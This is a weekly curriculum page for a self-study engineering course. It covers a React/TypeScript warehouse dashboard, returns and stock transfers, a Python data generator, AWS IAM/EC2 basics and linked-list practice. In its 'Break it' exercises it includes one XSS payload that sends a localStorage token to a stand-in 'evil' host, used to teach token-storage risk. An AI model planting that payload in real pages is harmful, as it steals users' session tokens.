# Week 7 — FlowGrid M4: operations dashboard, returns, transfers

[← Week 6](../week-06/) · [Roadmap](../../ROADMAP.md) · [Week 8 →](../week-08/)

**Phase 1 · FlowGrid** · Milestone **M4 — Operations dashboard + returns/transfers** (+ the Python `tools/` component begins)

| Block | Hours | What it means this week |
|---|---:|---|
| Project | 28 | React + TypeScript (Vite) dashboard: inventory by warehouse, orders, pick/pack screens, low-stock view, search/filter/sort/pagination; returns (restock or quarantine); two-phase stock transfers; scheduled low-stock alerts; **Python order/inventory generator** (`tools/`) |
| Learning | 7 | TypeScript, React (components, hooks, forms, router, API client, auth on the client), minimal HTML/CSS; AWS IAM + EC2 |
| DSA | 7 | Linked Lists — **8 new problems in Python** + Day-3/7/14/30 reviews + 1 Java rep |
| Interview / review | 3 | Think-aloud #3; **résumé-defense drills begin** (Java, Git, SQL) |

---

## 1. Main objective

Give FlowGrid a face and close the operational loop. The backend has been API-only for three
weeks; this week a **React + TypeScript dashboard** lets an ops manager see inventory by
warehouse, watch orders move, and lets an associate work pick/pack screens — all against the
paged/sorted/filtered endpoints and role model you built in M1–M3. On the backend, two flows that
every real warehouse needs: **returns** (restock or quarantine) and **two-phase stock
transfers** between warehouses (`in_transit` is real: stock leaves A before it arrives at B),
plus **scheduled low-stock alerts**.

This is also where FlowGrid's **Python engineering component** starts: `tools/generate_data.py`
— a realistic synthetic inventory & order generator (SKUs, warehouses, order mix) that writes
through the API (or SQL), pytest-tested, with a README. Week 8's load harness builds on it.

TypeScript and React are taught just-in-time, on top of last week's JavaScript. AWS starts with
IAM and EC2 so Week 8's deployment is not the first time you see the console.

Spec: [`18-projects/flowgrid/README.md`](../../18-projects/flowgrid/README.md) · M4 in
[`18-projects/flowgrid/milestones.md`](../../18-projects/flowgrid/milestones.md) ·
[`18-projects/flowgrid/failure-engineering.md`](../../18-projects/flowgrid/failure-engineering.md).

## 2. Prerequisites

- M3 tagged `m3`; full allocate → ship workflow works via API; CI green with Postgres + Redis.
- Week 6 JavaScript block done (promises, `fetch`, array methods). Node 20 LTS installed.
- An AWS account with **MFA on root, an IAM admin user, a billing alarm** — set up on Monday before anything else (see [`12-aws/cost-safety.md`](../../12-aws/cost-safety.md)).
- Python 3.12 venv in the FlowGrid repo (`tools/`), `pytest`, `requests`, `faker` (optional).

## 3. Learning topics

| Topic | Subtopics | Folder file |
|---|---|---|
| TypeScript | types vs interfaces, unions & narrowing, generics, `unknown` vs `any`, utility types (`Partial`, `Pick`), `strict` mode, typing API responses, discriminated unions for status enums | [`07-javascript-typescript/03-typescript.md`](../../07-javascript-typescript/03-typescript.md) |
| React fundamentals | Vite setup, components, props, JSX, lists & keys, conditional rendering, composition | [`08-react/01-fundamentals.md`](../../08-react/01-fundamentals.md), [`08-react/README.md`](../../08-react/README.md) |
| Hooks | `useState`, `useEffect` (and when not to), `useMemo`/`useCallback` (sparingly), custom hooks (`usePaged`, `useAuth`), data-fetching state (loading/error/data) | [`08-react/02-hooks.md`](../../08-react/02-hooks.md) |
| Forms & routing | controlled inputs, validation mapping from `ProblemDetail.errors[]`, React Router (routes, params, protected routes) | [`08-react/03-forms-routing.md`](../../08-react/03-forms-routing.md) |
| API client & auth on the client | typed `fetch` wrapper, bearer token storage trade-offs (memory vs `localStorage`), 401 handling, CORS on the Spring side, env-based base URL | [`08-react/04-api-integration-auth.md`](../../08-react/04-api-integration-auth.md) |
| Architecture & testing (first pass) | feature folders, container vs presentational, Vitest + React Testing Library for 2–3 components, MSW optional | [`08-react/05-architecture-testing.md`](../../08-react/05-architecture-testing.md), [`09-testing/frontend-testing.md`](../../09-testing/frontend-testing.md) |
| HTML/CSS minimum | semantic elements, flexbox/grid for a table + sidebar layout, a tiny utility CSS or one component library — ≤ 3 h total, ever | [`07-javascript-typescript/04-html-css-minimum.md`](../../07-javascript-typescript/04-html-css-minimum.md) |
| AWS IAM + EC2 | root vs IAM, users/roles/policies, least privilege, instance profiles, security groups, key pairs, launching `t3.micro`/`t4g.small`, SSH, cost guardrails | [`12-aws/iam.md`](../../12-aws/iam.md), [`12-aws/ec2.md`](../../12-aws/ec2.md), [`12-aws/cost-safety.md`](../../12-aws/cost-safety.md), [`12-aws/README.md`](../../12-aws/README.md) |
| Python for tooling (applied) | `dataclasses`, `random` with seeds, `requests.Session`, `argparse` subcommands, `pytest` fixtures + `monkeypatch`, `responses`/fake session for HTTP tests | [`19-python/04-testing-and-scripting.md`](../../19-python/04-testing-and-scripting.md) |

## 4. Concepts to learn

### 4.1 TypeScript: type the API contract once

```ts
export type OrderStatus = "RESERVED" | "ALLOCATED" | "PARTIALLY_SHIPPED" | "SHIPPED" | "CANCELLED";
export interface OrderSummary { id: number; customerRef: string; status: OrderStatus; createdAt: string; lineCount: number; }
export interface PageResponse<T> { items: T[]; page: number; size: number; totalElements: number; totalPages: number; }
export interface ProblemDetail { type?: string; title?: string; status: number; detail?: string; errors?: { field: string; message: string }[]; }

export function isProblem(x: unknown): x is ProblemDetail {
  return typeof x === "object" && x !== null && "status" in x;
}
```

Discriminated unions + `switch` with exhaustiveness (`never`) mirror Java's sealed types; generic
`PageResponse<T>` mirrors your Spring DTO. Keep these in `src/api/types.ts`, generated by hand from
OpenAPI (or `openapi-typescript` if you prefer — say why in the README).

- **Interview angle:** "`interface` vs `type`?" "`unknown` vs `any`?" "How do you narrow a union?" "How do you keep frontend types in sync with the backend?"
- **FlowGrid uses this:** every screen consumes `PageResponse<…>` and shows `ProblemDetail.errors[]` on forms.

### 4.2 A typed API client with auth and 401 handling

```ts
const BASE = import.meta.env.VITE_API_URL ?? "http://localhost:8080";
let token: string | null = null;                    // in memory; refresh on reload via login (document the trade-off)
export function setToken(t: string | null) { token = t; }

export async function api<T>(path: string, init: RequestInit = {}): Promise<T> {
  const res = await fetch(BASE + path, {
    ...init,
    headers: { "Content-Type": "application/json", ...(token ? { Authorization: `Bearer ${token}` } : {}), ...init.headers },
  });
  if (res.status === 401) { setToken(null); window.location.assign("/login"); }
  if (!res.ok) throw await res.json().catch(() => ({ status: res.status } satisfies ProblemDetail));
  return res.status === 204 ? (undefined as T) : res.json();
}
```

Spring side: `CorsConfigurationSource` allowing `http://localhost:5173` with `Authorization` header; in
production the dashboard is served from the same origin (Nginx/Compose) so CORS is dev-only.

- **Interview angle:** "Where do you store a JWT in the browser and why?" (memory/httpOnly cookie vs `localStorage` XSS exposure). "What is CORS actually protecting?"
- **FlowGrid uses this:** `src/api/client.ts`; the login page; protected routes.

### 4.3 React: a paged table driven by URL state

```tsx
function OrdersPage() {
  const [params, setParams] = useSearchParams();
  const page = Number(params.get("page") ?? 0), status = params.get("status") ?? "";
  const { data, loading, error } = usePaged<OrderSummary>("/api/orders", { page, size: 20, status, sort: "createdAt,desc" });
  if (error) return <ErrorBanner problem={error} />;
  return (
    <>
      <StatusFilter value={status} onChange={s => setParams({ page: "0", status: s })} />
      <Table rows={data?.items ?? []} loading={loading} columns={orderColumns} />
      <Pager page={page} totalPages={data?.totalPages ?? 0} onPage={p => setParams({ page: String(p), status })} />
    </>
  );
}
```

`usePaged` wraps `useEffect` + `AbortController` and returns `{data, loading, error}`; putting
filter/page state in the URL makes views shareable and the back button work.

- **Interview angle:** "What does `useEffect` run on and how do you cancel a stale request?" "Why keys on lists?" "When would you *not* use `useMemo`?"
- **FlowGrid uses this:** inventory, orders, pick lists, low-stock — all the same hook + table.

### 4.4 Returns and two-phase transfers on the backend

```
Return:    RECEIVED → (INSPECTED) → RESTOCKED | QUARANTINED     restock: on_hand += qty at the receiving warehouse (audited)
Transfer:  REQUESTED → IN_TRANSIT → RECEIVED | CANCELLED         dispatch: A.on_hand -= qty, transfer.qty in transit (not in any warehouse)
                                                                receive:  B.on_hand += qty
```

Each phase is its own transaction with row locks on the affected `inventory_level`. Between
phases the stock is *nowhere* — that is correct and must be visible in the "inventory by
warehouse" view as an `in_transit` column (derived from open transfers). Cancel after dispatch =
return to A (a compensating movement, audited), never a silent delete.

- **Interview angle:** "Why two phases instead of one transaction across both warehouses?" (physical reality, long duration, partial failure; the same reasoning as sagas). "How do you make `receive` idempotent?" (state check + unique constraint on the transfer id).
- **FlowGrid uses this:** `TransferService`, `ReturnService`; LedgerX later reuses "compensating entry" thinking.

### 4.5 Scheduled low-stock alerts

`@Scheduled(cron = "0 */15 * * * *")` computes SKUs with `available < reorder_point` per warehouse
(SQL from Week 4/6), diffs against the last run (Redis set from Week 6), and emits **one alert per
new low-stock pair** to an `alert` table + log line (email/SNS is Week 8+ optional). Guard against
duplicates with a unique constraint `(warehouse_id, sku_id, resolved_at IS NULL)` (partial unique index).

- **Interview angle:** "How do you avoid alert storms?" "What happens if two app instances run the job?" (ShedLock or a DB advisory lock — name it, implement only if you run two instances).
- **FlowGrid uses this:** the dashboard's low-stock view reads `alert` rows; M5's CloudWatch alarm is the infra-level twin.

### 4.6 Python: a seeded, tested data generator

```python
# tools/flowgrid_tools/generate.py
from dataclasses import dataclass
import random

@dataclass(frozen=True)
class OrderSpec:
    customer_ref: str
    lines: tuple[tuple[str, int], ...]     # (sku_code, qty)
    priority: str                          # STANDARD | EXPRESS

def make_orders(skus: list[str], n: int, *, seed: int, express_ratio: float = 0.2, max_lines: int = 4) -> list[OrderSpec]:
    rng = random.Random(seed)                                   # reproducible: same seed → same orders
    out: list[OrderSpec] = []
    for i in range(n):
        k = rng.randint(1, max_lines)
        lines = tuple((s, rng.randint(1, 5)) for s in rng.sample(skus, k))
        out.append(OrderSpec(f"C{i:05d}", lines, "EXPRESS" if rng.random() < express_ratio else "STANDARD"))
    return out
```

Tests: same seed → identical output; line counts within bounds; express ratio ≈ 0.2 ± 0.05 over
10 000 orders; the API writer retries on `5xx` but never re-sends a `POST /api/orders` without the
same `Idempotency-Key` (test with a fake session). CLI: `python -m flowgrid_tools generate --orders 500 --seed 42 --url http://localhost:8080 --token …`.

- **Interview angle:** "How did you test something random?" (inject the seed; assert distributions with tolerance). "Why Python for tooling next to a Java service?" (fast iteration, stdlib, pytest; the service stays Java).
- **FlowGrid uses this:** seeds demo data for the dashboard; Week 8's load harness reuses `make_orders`.

### 4.7 AWS: IAM least privilege and a first EC2 instance

- Root: MFA, no access keys, used only for billing. Daily work: an IAM user (or Identity Center) with MFA and `AdministratorAccess` *for now*; a dedicated `flowgrid-deploy` role/user with only what Week 8 needs (ECR/GHCR pull is external; S3 `PutObject` on one bucket; CloudWatch `PutLogEvents`).
- EC2: `t3.micro`/`t4g.small` in the free tier where possible, Amazon Linux 2023 or Ubuntu 24.04, security group allowing 22 from *your IP only* and 80/443 from anywhere; instance profile instead of access keys on the box; stop it when not in use.

```bash
ssh -i ~/.ssh/flowgrid.pem ubuntu@<public-ip>
sudo apt-get update && sudo apt-get install -y docker.io docker-compose-v2 && sudo usermod -aG docker ubuntu
```

- **Interview angle:** "What is the difference between an IAM user, role and policy?" "Why an instance profile instead of keys on the server?" "What does a security group do?" (stateful firewall at the ENI).
- **FlowGrid uses this:** the Week 8 deploy target; the same role pattern for every later project.

## 5. Resources

- [TypeScript Handbook](https://www.typescriptlang.org/docs/handbook/intro.html) (Everyday Types, Narrowing, Generics); [React docs — Learn](https://react.dev/learn) (Describing the UI, Adding Interactivity, Managing State, Escape Hatches → `useEffect`); [React Router docs](https://reactrouter.com/); [Vite guide](https://vite.dev/guide/); [Vitest](https://vitest.dev/), [Testing Library](https://testing-library.com/docs/react-testing-library/intro/).
- [MDN — CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS); [Spring — CORS](https://docs.spring.io/spring-framework/reference/web/webmvc-cors.html); [Spring — scheduling](https://docs.spring.io/spring-framework/reference/integration/scheduling.html).
- [AWS IAM user guide — best practices](https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html); [EC2 user guide — get started](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EC2_GetStarted.html); [AWS Free Tier](https://aws.amazon.com/free/); [Billing alarms](https://docs.aws.amazon.com/AmazonCloudWatch/latest/monitoring/monitor_estimated_charges_with_cloudwatch.html).
- Python: [pytest — fixtures](https://docs.pytest.org/en/stable/how-to/fixtures.html), [`monkeypatch`](https://docs.pytest.org/en/stable/how-to/monkeypatch.html); [`random.Random`](https://docs.python.org/3/library/random.html); [packaging with `pyproject.toml`](https://packaging.python.org/en/latest/guides/writing-pyproject-toml/).
- Résumé defense: [`17-resume-tech-defense/java.md`](../../17-resume-tech-defense/java.md), [`17-resume-tech-defense/git.md`](../../17-resume-tech-defense/git.md), [`17-resume-tech-defense/sql.md`](../../17-resume-tech-defense/sql.md), [`RESUME_INTERVIEW_QUESTIONS.md`](../../RESUME_INTERVIEW_QUESTIONS.md).
- DSA: [`03-dsa/08-linked-lists.md`](../../03-dsa/08-linked-lists.md), NeetCode "Linked List".

## 6. Exercises + coding assignments (inside FlowGrid)

| # | Exercise | Acceptance |
|---|---|---|
| 1 | Type the API: `types.ts` for every M1–M4 response and `ProblemDetail`; a `never`-exhaustive `statusLabel(status)` | `tsc --noEmit` clean under `strict` |
| 2 | `usePaged<T>` hook with `AbortController`; used by ≥ 4 pages; one Vitest test with a fake `fetch` | Stale responses never overwrite newer ones (test) |
| 3 | Pick screen: associate sees open pick lists for *their* warehouse, marks tasks picked, sees `409` on an already-picked task rendered as a banner, not a crash | Manual walkthrough + component test |
| 4 | Transfer flow end to end: request → dispatch → receive; the inventory view shows `in_transit` between phases | IT on the backend + a manual dashboard check with screenshots in `docs/` |
| 5 | Python generator: `pytest -q` ≥ 10 tests; `README.md` in `tools/`; `pyproject.toml`; a `make seed` / `scripts/seed.sh` that runs it against Compose | 500 orders seeded in < 60 s locally; reproducible with `--seed` |

### Break it

- Remove the `AbortController` from `usePaged`, click through pages fast on a throttled network (DevTools "Slow 3G"). Watch an older page overwrite a newer one. Restore.
- Put the JWT in `localStorage`, then inject `<img src=x onerror="fetch('https://evil/?t='+localStorage.token)">` via a "customer ref" you render with `dangerouslySetInnerHTML`. Observe the exfiltration path. Remove `dangerouslySetInnerHTML`; decide memory vs cookie; document.
- Make transfer `dispatch` and `receive` one transaction; kill the app between them (sleep + `kill -9`). Now stock is neither gone nor arrived — nothing was committed — but a *real* truck already left. Explain why the two-phase design models reality and restore it.
- Run the low-stock job every second with the diff disabled. Alert storm. Restore the diff and the partial unique index.
- Open the EC2 security group to `0.0.0.0/0` on port 22 for five minutes and read the auth log afterwards (`journalctl -u ssh`). Close it. Lesson learned about the internet.

### Debug it

- A component re-fetches in an infinite loop: an object literal in `useEffect` deps. Find it with React DevTools "why did this render" or a `console.count`; fix by depending on primitives.
- `PATCH /api/pick-tasks/{id}` returns `403` from the dashboard but `200` from `curl`: CORS preflight lacks `PATCH` in allowed methods. Read the browser's Network tab, fix `CorsConfiguration`.
- Python: the generator's API writer creates duplicate orders after a `502`: the retry generated a new `Idempotency-Key`. Trace with a logging `Session`, fix by generating the key per order *before* the retry loop; add the regression test.
- The dashboard works locally but `npm run build` fails on a type error only `strict` catches — read the `tsc` output, fix the type, not the config.

## 7. DSA — Linked Lists (8 new, in Python)

Guide: [`03-dsa/08-linked-lists.md`](../../03-dsa/08-linked-lists.md); templates: [`PYTHON_INTERVIEW_CHEATSHEET.md`](../../PYTHON_INTERVIEW_CHEATSHEET.md) (`ListNode`, dummy head, fast/slow).
Limits: Easy 20 min, Medium 35 min.

| Day | Problem | Difficulty | Limit | Focus |
|---|---|---|---|---|
| Mon | [206. Reverse Linked List](https://leetcode.com/problems/reverse-linked-list/) | Easy | 15 min | `prev, cur = cur, nxt` idiom; iterative *and* recursive |
| Mon | [876. Middle of the Linked List](https://leetcode.com/problems/middle-of-the-linked-list/) | Easy | 10 min | fast/slow |
| Tue | [21. Merge Two Sorted Lists](https://leetcode.com/problems/merge-two-sorted-lists/) | Easy | 20 min | dummy head |
| Tue | [141. Linked List Cycle](https://leetcode.com/problems/linked-list-cycle/) | Easy | 15 min | Floyd |
| Wed | [19. Remove Nth Node From End of List](https://leetcode.com/problems/remove-nth-node-from-end-of-list/) | Medium | 25 min | two pointers with gap + dummy |
| Thu | [143. Reorder List](https://leetcode.com/problems/reorder-list/) | Medium | 35 min | middle + reverse + merge (composition of the three above) |
| Thu | [2. Add Two Numbers](https://leetcode.com/problems/add-two-numbers/) | Medium | 30 min | carry; `divmod` |
| Sat | [146. LRU Cache](https://leetcode.com/problems/lru-cache/) | Medium | 40 min | doubly linked list + dict (or `OrderedDict` — do both) |

**Java rep (Sat, 30 min):** re-do **146. LRU Cache** in Java with `LinkedHashMap(accessOrder=true)` + `removeEldestEntry`, then note the difference from the hand-rolled version.

**Spaced reviews due:** Day-30 of Week 3 — Valid Palindrome, Two Sum II (Mon), 3Sum (Tue), Container
With Most Water, Running Sum (Wed), Find Pivot Index, Range Sum Query (Thu), Subarray Sum Equals K
(Sat) → `Mastered` on a clean timed solve. Day-14 of Week 5 — Valid Parentheses, Min Stack (Mon),
Queue using Stacks (Tue), Evaluate RPN, Next Greater Element I (Wed), Daily Temperatures, Car Fleet
(Thu), Sliding Window Maximum (Sat). Day-7 of Week 6 — Binary Search, Search Insert (Mon), First Bad
Version, First and Last Position (Tue), Search 2D Matrix (Wed), Koko, Find Minimum Rotated (Thu),
Search Rotated (Sat). Day-3 of this week's — Reverse Linked List, Middle (Thu), Merge Two Sorted,
Cycle (Fri), Remove Nth (Sat), Reorder, Add Two Numbers (Sun).

## 8. Project work — FlowGrid M4

Read M4 in [`milestones.md`](../../18-projects/flowgrid/milestones.md) first. GitHub milestone
**M4 — Operations dashboard + returns/transfers**, issues labelled `m4`, `frontend`, `backend`, `tools`.

### Task checklist

- [ ] Mon: AWS account hygiene (MFA, IAM user, billing alarm); `V5__returns_transfers_alerts.sql`; returns API (`POST /api/returns`, inspect → restock/quarantine) with audit; `dashboard/` Vite + React + TS scaffold, `types.ts`, `client.ts`, login page, protected route; CORS config.
- [ ] Tue: transfers API (request/dispatch/receive/cancel, two-phase, row locks, idempotent receive); `in_transit` in the inventory summary; backend ITs.
- [ ] Wed: `usePaged`, inventory-by-warehouse page (filters: warehouse/region/lowStockOnly; sort; pager), orders page + order detail (lines, allocations, shipments).
- [ ] Thu: pick screen (associate), pack/ship screen (manager), returns + transfers screens with forms mapping `ProblemDetail.errors[]`; low-stock view; scheduled alerts job + `alert` table + partial unique index.
- [ ] Fri: Python `tools/` package: generator + API writer + `pytest` + README + `pyproject.toml`; seed 500 orders; dashboard screenshots for `docs/`.
- [ ] Sat: Vitest tests (3 components + hook), `npm run build` served by the Spring app or an Nginx container in Compose; EC2 instance launched + Docker installed (no deploy yet); Break-it/Debug-it; failure scenarios; think-aloud #3; PR; tag `m4`.

### Acceptance criteria (summary)

- Dashboard: login, inventory by warehouse (search/filter/sort/pagination), orders list + detail, pick and pack screens usable by the right roles, low-stock view; errors rendered from `ProblemDetail`; `tsc` strict clean; ≥ 4 frontend tests.
- Returns: received → restocked (on-hand up, audited) or quarantined (not available); transfers: two-phase with `in_transit` visible; cancel after dispatch compensates.
- Low-stock alerts run on schedule, deduplicated; visible in the dashboard.
- `tools/`: reproducible generator with tests, README, runs against Compose via CLI.
- Compose runs app + db + redis + dashboard; CI builds the frontend (`npm ci && npm run build && npm test`) alongside `mvn verify`.

### Verification tests

- Backend ITs: return restock increases on-hand and audits; quarantine does not touch `available`; transfer dispatch/receive quantities; receive twice → second is a no-op `200`/`409` (decide, document); cancel after dispatch returns stock to origin; alert job dedupes across runs.
- Frontend: `usePaged` cancels stale requests; `OrdersPage` renders rows and pager from a fake response; `ErrorBanner` renders `errors[]`; protected route redirects when no token.
- Python: seed determinism; distribution tolerance; idempotency-key stability across retries; CLI arg parsing.

### Failure-engineering scenarios this week

From [`failure-engineering.md`](../../18-projects/flowgrid/failure-engineering.md): **transfer
crash between dispatch and receive** (stock in transit is accounted for), **duplicate receive**,
**alert storm**, **stale dashboard state after a `409`** (refetch policy), **token expiry
mid-session** (401 → login without losing the current URL). Log in `docs/FAILURE_LOG.md`.

### PR expectations

≈ 4 PRs (returns+transfers; dashboard core; screens+alerts; tools+compose+docs). Frontend PRs include screenshots. CI must run both the Maven and the Node jobs.

## 9. Git activity

```bash
git switch -c feat/m4-dashboard-core
git commit -m "feat(dashboard): vite + react + ts scaffold with typed api client"
git commit -m "feat(transfers): two-phase stock transfer with in_transit accounting"
git commit -m "feat(tools): seeded order generator with pytest"
git commit -m "ci: add node job (npm ci, build, test)"
git tag -a m4 -m "FlowGrid M4: dashboard, returns, transfers, alerts" && git push origin m4
```

- Add `dashboard/node_modules`, `dist/`, `tools/.venv`, `.pytest_cache` to `.gitignore`.
- A monorepo layout (`backend/`? or root Maven + `dashboard/` + `tools/`) — decide once, write it in `docs/ARCHITECTURE.md`.
- Use `git stash` at least once for real (switching from a half-done screen to a hotfix branch).

## 10. Interview preparation

**Think-aloud #3** (Sat, 60 min): one unseen Medium in Python (suggested: [138. Copy List with Random Pointer](https://leetcode.com/problems/copy-list-with-random-pointer/)), recorded, scored, logged.

**Résumé-defense drills begin (Track B — Java, Git, SQL; 3 questions per week, out loud, 30 min on Tue):**
pick one from each of [`17-resume-tech-defense/java.md`](../../17-resume-tech-defense/java.md),
[`17-resume-tech-defense/git.md`](../../17-resume-tech-defense/git.md),
[`17-resume-tech-defense/sql.md`](../../17-resume-tech-defense/sql.md), and cross-check with
[`RESUME_INTERVIEW_QUESTIONS.md`](../../RESUME_INTERVIEW_QUESTIONS.md). Answer with an example
from FlowGrid (e.g. Java: "explain `equals`/`hashCode` and where it bit you" → JPA entities; Git:
"how do you handle a bad commit on main" → revert vs reset with your PR workflow; SQL: "explain a
slow query you fixed" → the `EXPLAIN` from Week 6). Record and score in [`trackers/interview-tracker.md`](../../trackers/interview-tracker.md).

Questions to answer out loud:

Track A: 1. Why does the dummy head simplify list problems? 2. Prove Floyd's cycle detection terminates. 3. LRU: why O(1) needs both a hash map and a doubly linked list.
Track B: 4. How does your dashboard authenticate and what would you change for production? 5. Why is a stock transfer two-phase? 6. `useEffect` — what runs when, and how do you cancel? 7. IAM user vs role vs policy; why an instance profile? 8. How did you test a random data generator?

Plus M4 questions from [`18-projects/flowgrid/interview-questions.md`](../../18-projects/flowgrid/interview-questions.md), one per day.

## 11. Revision work

- Re-explain Week 6's cache invalidation ordering, then the dashboard's refetch-after-mutation policy — same problem, client side.
- Redo one Week 5 stack problem marked `Needs Review`.
- Re-read [`06-rest-apis/api-design-guide.md`](../../06-rest-apis/api-design-guide.md) pagination section and check every dashboard table honours it.

## 12. Daily plan

| Day | Blocks |
|---|---|
| **Mon** (8 h) | Learning 2: TypeScript essentials; AWS account hygiene (IAM, MFA, billing alarm) · Project 4.5: `V5`, returns API + tests; Vite scaffold, `types.ts`, `client.ts`, login, protected route, CORS · DSA 1.5: 206, 876 + Day-30 (Valid Palindrome, Two Sum II) + Day-14 (Valid Parentheses, Min Stack) + Day-7 (Binary Search, Search Insert) |
| **Tue** (8 h) | Project 5: transfers two-phase + `in_transit` + ITs · DSA 2: 21, 141 + Day-30 (3Sum) + Day-14 (Queue via Stacks) + Day-7 (First Bad Version, First/Last Position) · Interview 1: **résumé-defense drill #1** (Java, Git, SQL) |
| **Wed** (8 h) | Learning 2: React fundamentals + hooks · Project 4.5: `usePaged`, inventory page, orders list/detail · DSA 1.5: 19 + Day-30 (Container, Running Sum) + Day-14 (RPN, Next Greater) + Day-7 (Search 2D Matrix) |
| **Thu** (8 h) | Project 5: pick/pack/returns/transfers screens, forms + `ProblemDetail` mapping, low-stock view, alerts job · DSA 2: 143, 2 + Day-30 (Pivot, Range Sum) + Day-14 (Daily Temps, Car Fleet) + Day-7 (Koko, Find Min Rotated) + Day-3 (206, 876) · Docs 1: `ARCHITECTURE.md` (frontend + tools layout) |
| **Fri** (5 h) | Learning 1.5: forms/routing, frontend testing; Python fixtures/`monkeypatch` · Project 2: `tools/` generator + tests + README; seed 500 orders; screenshots · DSA 1: Day-3 (21, 141) · Retro 0.5 |
| **Sat** (6 h) | Project 3: Vitest tests, production build in Compose, EC2 launch + Docker install, Break-it/Debug-it, failure scenarios, PR, tag `m4` · DSA 1: 146 + Day-30 (Subarray Sum K) + Day-14 (Sliding Window Max) + Day-7 (Search Rotated) + Day-3 (19) + **Java rep** (146) · Interview 2: **think-aloud #3** |
| **Sun** (2–3 h) | End-of-week test (§13) · Day-3 (143, 2) · trackers · plan Week 8 (read [`12-aws/deploy-walkthrough.md`](../../12-aws/deploy-walkthrough.md)) · rest |

## 13. End-of-week test (100 min, timed)

**Part A — DSA in Python (40 min).** [143. Reorder List](https://leetcode.com/problems/reorder-list/)
and [19. Remove Nth Node From End of List](https://leetcode.com/problems/remove-nth-node-from-end-of-list/) from blank; complexities out loud.

**Part B — Concepts (25 min).**

<details>
<summary>1. TypeScript: <code>function label(s: OrderStatus): string { switch (s) { … default: const x: never = s; return x; } }</code> — what does the <code>never</code> line buy you?</summary>

Compile-time exhaustiveness: if a new status is added to the union and the `switch` is not updated,
`s` is no longer `never` in `default` and `tsc` fails. Same idea as sealed-type `switch` in Java 21.
</details>

<details>
<summary>2. Why can an older paginated response overwrite a newer one, and what fixes it?</summary>

Requests resolve out of order; the effect for page 2 may finish after page 3's. Abort the previous
request on dependency change (`AbortController` in the effect cleanup) and/or ignore responses whose
request id is not the latest.
</details>

<details>
<summary>3. Transfer <code>receive</code> arrives twice (client retry). What should happen and how do you enforce it?</summary>

Second call is a no-op with a clear status (`200` with the same body, or `409` — pick and document).
Enforce with the state check (`IN_TRANSIT → RECEIVED` only once) under the transfer's row lock,
so concurrent duplicates cannot both pass the check.
</details>

<details>
<summary>4. JWT in <code>localStorage</code> vs memory vs httpOnly cookie — one risk each.</summary>

`localStorage`: readable by any XSS. Memory: lost on reload (needs re-login or a refresh flow).
httpOnly cookie: immune to JS reads but needs CSRF protection and same-site config.
</details>

<details>
<summary>5. IAM: why does the EC2 instance get a role instead of an access key in an env file?</summary>

Instance-profile credentials are temporary, rotated automatically, scoped by policy and never sit
on disk; a leaked env file with long-lived keys is a full account compromise until rotated.
</details>

<details>
<summary>6. Python: how do you make <code>random</code>-based output testable without mocking <code>random</code>?</summary>

Inject a `random.Random(seed)` instance (or the seed) so the same seed yields identical output; assert
statistical properties with tolerance over a large n for distribution checks.
</details>

**Part C — Practical (30 min).** Add a "Cancel transfer" button to the transfers screen: typed API
call, optimistic-free refetch after success, `ProblemDetail` banner on `409`; backend already
supports it. Include one component test with a fake `fetch`. Pass = `tsc` clean, test green, works against Compose.

**Part D — Explain out loud (5 min).** "Walk me through what happens in the browser and the server
when an associate clicks *Mark picked*." (event → API call with bearer → CORS preflight? → filter →
`@PreAuthorize` → transaction + row lock → state transition → audit → response → refetch.)

## 14. Mastery checklist

- [ ] I can scaffold a Vite + React + TS app, type an API contract, and build a paged/filterable table with URL state.
- [ ] I can write a custom hook with cancellation and test it; I can explain `useEffect` and stale-request bugs.
- [ ] I can explain client-side auth trade-offs and CORS precisely.
- [ ] Returns and two-phase transfers are implemented with row locks, idempotent phases and audit; the low-stock job is deduplicated.
- [ ] `tools/` has a reproducible, tested Python generator with a README.
- [ ] I have an AWS account with MFA, IAM user, billing alarm, and a running (stoppable) EC2 instance with Docker.
- [ ] Linked-list problems: 8 re-solvable in Python within limits; Java rep done; think-aloud #3 and résumé drill #1 scored.

## 15. Expected deliverables

- `flowgrid`: milestone M4 closed, ≥ 4 PRs, tag `m4`, `dashboard/` with tests, `tools/` with pytest + README, CI with Maven + Node jobs, `docs/ARCHITECTURE.md`, `docs/API.md` updated, `docs/FAILURE_LOG.md` (+5), screenshots in `docs/img/`.
- AWS: account hardened; EC2 instance ready (stopped when idle); notes in `docs/DEPLOYMENT.md`.
- [`trackers/dsa-tracker.md`](../../trackers/dsa-tracker.md): 54 problems, 7 Java reps, Week 3 set `Mastered` where earned.
- [`trackers/interview-tracker.md`](../../trackers/interview-tracker.md): think-aloud #3, résumé drill #1 (Java/Git/SQL).
- [`trackers/weekly-progress.md`](../../trackers/weekly-progress.md), [`trackers/project-tracker.md`](../../trackers/project-tracker.md) (M4 done), [`trackers/technology-tracker.md`](../../trackers/technology-tracker.md) (TypeScript, React, AWS IAM/EC2, Python tooling).

## 16. If you're behind / stretch

**Behind:** preserve: inventory + orders pages with auth, pick screen, transfers two-phase, the
Python generator (Week 8 needs it). Cut: returns UI (API only), pack screen (use `curl`), frontend
tests beyond one, low-stock alerts (move to Week 8 Monday). DSA: drop 146 (do it in Week 8 as the Java rep) and 2; keep all reviews.

**Stretch:** `openapi-typescript` generation wired into `npm run gen`; MSW-based frontend tests;
optimistic updates with rollback on the pick screen; SNS/email for alerts behind a property;
[138. Copy List with Random Pointer](https://leetcode.com/problems/copy-list-with-random-pointer/) and
[287. Find the Duplicate Number](https://leetcode.com/problems/find-the-duplicate-number/) in Python.
